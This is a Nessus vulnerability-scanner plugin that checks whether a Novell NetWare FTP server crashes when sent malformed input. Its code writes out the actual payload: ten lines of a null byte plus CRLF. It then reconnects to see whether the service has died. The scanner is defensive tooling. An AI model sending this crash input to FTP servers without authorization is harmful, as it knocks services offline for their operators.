#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if(description)
{
 script_id(11614);
 script_version ("$Revision: 1.15 $");
 script_bugtraq_id(7072);
 script_osvdb_id(55308);

 script_name(english:"Novell NetWare FTPServ Malformed Input Remote DoS");
 script_summary(english:"Attempts to crash the remote FTPd");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote FTP server is affected by a denial of service
vulnerability." );
 script_set_attribute(attribute:"description", value:
"The installed version of Novell FTPServ does not handle certain types
of input properly. An attacker can exploit this flaw to crash the FTP
service." );
 script_set_attribute(attribute:"solution", value:
"Upgrade to the latest version of Novell FTPServ." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2003/05/09");
 script_cvs_date("$Date: 2011/03/11 21:52:33 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 2003-2011 Tenable Network Security, Inc.");
 script_family(english:"Netware");
 script_dependencie("ftpserver_detect_type_nd_version.nasl", "ftp_anonymous.nasl");
 script_require_keys("ftp/login");
 script_require_ports("Services/ftp", 21);
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("misc_func.inc");
include("ftp_func.inc");


port = get_ftp_port(default: 21);

soc = open_sock_tcp(port);
if (!soc) exit(1, "Cannot connect to TCP port "+port+".");

r = ftp_recv_line(socket:soc);
if (!r) exit(1, "Cannot read the FTP banner on port "+port+".");
 
send(socket:soc, data: 'SYST\r\n');
r = recv_line(socket:soc, length:4096);

if ("NETWARE" >!< r) exit(0, "The FTP server on port "+port+" is not Netware.");

for (i = 0; i < 10; i ++)
  send(socket:soc, data: '\0\r\n');
close(soc);
  
sleep(1);
soc = open_sock_tcp(port);
if (! soc)
{
  if (service_is_dead(port: port) <= 0)	# Alive or timeout
    exit(1, "Could not reconnect to port "+port+".");
  security_warning(port);
  exit(0);
}

if (report_paranoia < 2) exit(0);

  r = ftp_recv_line(socket:soc);
  if(!r) { security_warning(port); exit(0); }
  close(soc);
